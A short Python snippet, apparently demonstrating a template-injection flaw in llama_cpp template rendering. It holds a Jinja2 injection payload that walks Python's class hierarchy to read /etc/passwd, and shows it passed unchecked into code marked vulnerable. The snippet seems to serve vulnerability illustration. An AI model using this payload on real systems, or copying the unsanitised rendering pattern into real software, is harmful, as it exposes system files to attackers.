from llama_cpp import Llama

# Load a model
model = Llama(model_path="path/to/model.gguf")

# User-supplied input (potentially malicious)
user_input = "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}"

# Vulnerable code
template = model.get_template(user_input)
result = template.render()

print(result)
